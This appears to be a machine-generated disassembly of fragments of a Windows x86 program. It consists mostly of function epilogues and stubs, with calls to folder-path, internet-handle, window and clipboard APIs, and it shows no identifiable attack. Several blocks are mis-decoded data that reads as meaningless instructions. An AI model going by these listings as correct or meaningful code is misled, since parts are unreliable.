sub_3af15e3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af18f4
jmp sub_3a64b54
sub_3af18fb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af191e
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_3a65dec
retn
sub_3af1917
jmp sub_3a64b54
sub_3af191e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3af1a3c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
retn
sub_3af1bb5
jmp sub_3a64b54
sub_3af1bbc
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3af1bc4
push 0x0
xor ecx ecx
call sub_3af1af0
retn
sub_3af1bd0
xor ecx ecx
mov edx 0x20
call sub_3a63a44
retn
sub_3af1e92
jmp sub_3a64b54
sub_3af1e99
pop ebp
retn
SHGetFolderPathA
jmp [ SHGetFolderPathA@IAT ]
sub_3af2062
jmp sub_3a648a0
sub_3af20b5
jmp sub_3a64b54
sub_3af20bc
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af2237
jmp sub_3a64b54
sub_3af223e
pop ebx
mov esp ebp
pop ebp
retn
sub_3af2297
jmp sub_3a64b54
sub_3af229e
pop ebx
pop ecx
pop ebp
retn
sub_3af2317
jmp sub_3a64b54
sub_3af231e
pop ebx
mov esp ebp
pop ebp
retn
sub_3af23b7
jmp sub_3a64b54
sub_3af23be
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3af2512
jmp sub_3a64b54
sub_3af2519
pop ebx
pop ecx
pop ebp
retn
sub_3af27e2
jmp sub_3a64b54
sub_3af27e9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af2a93
jmp sub_3a64b54
sub_3af2a9a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af2ab8
mov eax [ ebp - 0xc ]
push eax
call InternetCloseHandle
retn
sub_3af2ab1
jmp sub_3a64b54
sub_3af2ab8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af2ae0
lea eax [ ebp - 0x564 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af2ad9
jmp sub_3a64b54
sub_3af2ae0
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af2b57
jmp sub_3a64b54
sub_3af2b5e
mov eax ebx
pop ebx
pop ebp
retn 0x8
sub_3af2bec
jmp sub_3a64b54
sub_3af2bf3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3af2c7a
jmp sub_3a64b54
sub_3af2c81
pop ebx
mov esp ebp
pop ebp
retn
sub_3af2ddb
jmp sub_3a64b54
sub_3af2de2
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3af2e95
jmp sub_3a64b54
sub_3af2e9c
pop ebx
pop ecx
pop ebp
retn
sub_3af3088
jmp sub_3a64b54
sub_3af30d0
jmp sub_3a64b54
sub_3af30d7
mov esp ebp
pop ebp
retn
sub_3af3318
jmp sub_3a64b54
sub_3af331f
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3af3553
jmp sub_3a64b54
sub_3af35a7
jmp sub_3a64b54
sub_3af35ae
pop ebx
mov esp ebp
pop ebp
retn
sub_3af369a
jmp sub_3a64b54
sub_3af37ac
jmp sub_3a64b54
sub_3af37b3
pop ebp
retn
sub_3af3d14
jmp sub_3a64b54
sub_3af3d1b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3af3e55
jmp sub_3a64b54
sub_3af3e5c
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3af42e6
jmp sub_3a64b54
sub_3af42ed
pop ebx
mov esp ebp
pop ebp
retn
sub_3af4d06
jmp sub_3a648a0
sub_3af4d0b
call sub_3a64cb0
jmp sub_3af5608
sub_3af4f0c
jmp sub_3a648a0
sub_3af4f11
call sub_3a64cb0
jmp sub_3af5608
sub_3af4ff2
jmp sub_3a648a0
sub_3af4ff7
call sub_3a64cb0
jmp sub_3af5608
j_sub_3a648a0#8
jmp sub_3a648a0
sub_3af50dd
call sub_3a64cb0
jmp sub_3af5608
j_sub_3a648a0#7
jmp sub_3a648a0
sub_3af51c3
call sub_3a64cb0
jmp sub_3af5608
sub_3af52a4
jmp sub_3a648a0
sub_3af52a9
call sub_3a64cb0
jmp sub_3af5608
j_sub_3a648a0#6
jmp sub_3a648a0
sub_3af538c
call sub_3a64cb0
jmp sub_3af5608
sub_3af5655
jmp sub_3a64b54
sub_3af565c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af5a26
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3af5a34
jmp sub_3a64b54
j_sub_3af5a26
jmp sub_3af5a26
sub_3af5a3b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3af5ac9
jmp sub_3a64b54
sub_3af5ad0
pop ebx
pop ecx
pop ebp
retn
sub_3af5b31
jmp sub_3a64b54
sub_3af5b38
pop ebx
pop ecx
pop ebp
retn
sub_3af5c2c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
pop ebp
retn 0x8
sub_3af5c99
jmp sub_3a64b54
sub_3af5ca0
pop ebx
pop ecx
pop ebp
retn
sub_3af5d4d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
j_sub_3a64b54#9
jmp sub_3a64b54
j_sub_3af5d4d
jmp sub_3af5d4d
sub_3af5d62
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3af5d7b
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
pop ebp
retn 0x8
sub_3af5d94
push ebx
mov ebx ecx
push 0x7d0
call Sleep
mov edx r-xdata
mov eax ebx
call sub_3ae35c4
pop ebx
retn
sub_3af5dc3
add [ ebx - 0x75 ] dl
fldcw [ eax - 0x30 ]
pop es
add [ eax ] al
call Sleep
mov edx r-xdata
mov eax ebx
call sub_3ae35c4
pop ebx
retn
sub_3af5e7c
jmp sub_3a64b54
sub_3af5e83
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3af5eb8
retn
j_sub_3a648a0#5
jmp sub_3a648a0
j_sub_3a64b54#8
jmp sub_3a64b54
sub_3af6087
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af60c4
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call ShowWindow
retn
sub_3af614d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3af615b
jmp sub_3a64b54
j_sub_3af614d
jmp sub_3af614d
sub_3af6162
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3af6209
jmp sub_3a64b54
sub_3af6210
pop ebx
pop ecx
pop ebp
retn
sub_3af62db
jmp sub_3a64b54
sub_3af62e2
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_3a648a0#4
jmp sub_3a648a0
sub_3af632e
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3af6338
mov eax [ rw-data ]
call sub_3acb6a4
retn
sub_3af6389
jmp sub_3a64b54
sub_3af6390
pop ebp
retn
sub_3af6a46
jmp sub_3a64b54
sub_3af6c77
jmp sub_3a64b54
sub_3af6c7e
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af7198
jmp sub_3a64b54
sub_3af719f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af7360
jmp sub_3a64b54
sub_3af7367
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3af819b
jmp sub_3a64b54
sub_3af81a2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_3a648a0#3
jmp sub_3a648a0
sub_3af85d9
jmp sub_3a64b54
sub_3af85e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_3a648a0#2
jmp sub_3a648a0
j_sub_3a64b54#7
jmp sub_3a64b54
sub_3af889e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_3a64b54#5
jmp sub_3a64b54
sub_3af8afb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af8c10
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_3a652c4
retn
sub_3af8c1e
jmp sub_3a64b54
j_sub_3af8c10
jmp sub_3af8c10
sub_3af8c25
pop ebx
mov esp ebp
pop ebp
retn
sub_3af8c2f
[ ecx ]
sub_3af8c7f
[ eax ]
sub_3af8df6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
j_sub_3a64b54#6
jmp sub_3a64b54
j_sub_3af8df6
jmp sub_3af8df6
sub_3af8e0b
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3af8fb7
jmp sub_3a64b54
sub_3af8fbe
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
j_sub_3a64b54#4
jmp sub_3a64b54
sub_3af9043
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3af91e8
jmp sub_3a64b54
sub_3af91ef
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_3a648a0
jmp sub_3a648a0
sub_3af92a4
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
mov eax [ eax + 0x278 ]
mov edx [ ebp - 0x4 ]
call sub_3adb714
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3af92e9
dec [ ebx - 0x2dccf7c0 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx r-xdata
call sub_3ae35c4
pop ebx
retn
sub_3af9345
jmp sub_3a64b54
sub_3af934c
pop ecx
pop ebp
retn
sub_3af9516
jmp sub_3a64b54
sub_3af951d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_3a64b54#3
jmp sub_3a64b54
sub_3af968e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_3a64b54#2
jmp sub_3a64b54
sub_3af96de
pop ebp
retn
sub_3afa098
sub [ rw-data ] 0x1
jae r-xdata
retn
xor eax eax
mov [ rw-data ] eax
sub_3afa11e
jmp sub_3a64b54
sub_3afa125
pop ebp
retn
sub_3afa1e5
jmp sub_3a64b54
sub_3afa1ec
pop ebp
retn
sub_3afa1f0
sub [ rw-data ] 0x1
retn
j_sub_3a64b54
jmp sub_3a64b54
sub_3afa288
pop ebp
retn
sub_3afa28c
sub [ rw-data ] 0x1
retn
sub_3afa294
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_3a86790
sub_3afa2a4
sub [ rw-data ] 0x1
retn
sub_3afa2ac
sub [ rw-data ] 0x1
retn
sub_3afa3b0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a90e0c
mov [ rw-data ] eax
sub_3afa3cc
sub [ rw-data ] 0x1
retn
sub_3afa3d4
sub [ rw-data ] 0x1
retn
sub_3afa474
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
call sub_3a79ac4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_3a79b10
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
sub_3afa4f8
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_3afa54d
add [ eax ] al
add [ ebx - 0x4f9413d3 ] al
add eax [ ecx ]
jae r-xdata
retn
call sub_3aa1900
sub_3afa66e
jmp sub_3a64b54
sub_3afa675
pop ebp
retn
sub_3afa678
sub [ rw-data ] 0x1
retn
sub_3afa680
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_3a79b10
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_3a79b10
sub_3afa703
jmp sub_3a64b54
sub_3afa70a
pop ebp
retn
sub_3afa71b
add [ ebx - 0x4f931bd3 ] al
add eax [ ecx ]
jae r-xdata
retn
mov eax sub_3ad134c
call sub_3a64fb4
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_3a63a44
sub_3afa744
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_3ad1448
call sub_3a64f8c
sub_3afa758
sub [ rw-data ] 0x1
retn
sub_3afa760
sub [ rw-data ] 0x1
retn
sub_3afa768
sub [ rw-data ] 0x1
retn
sub_3afa770
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_3a79b10
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3aec100
mov [ rw-data ] eax
sub_3afa7a4
sub [ rw-data ] 0x1
retn
sub_3afa91e
jmp sub_3a64b54
sub_3afa925
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3afa953
inc [ edx ]
add [ eax ] al
add [ eax + 0x60 ] ah
add [ eax ] al
sub [ rw-data ] 0x1
retn
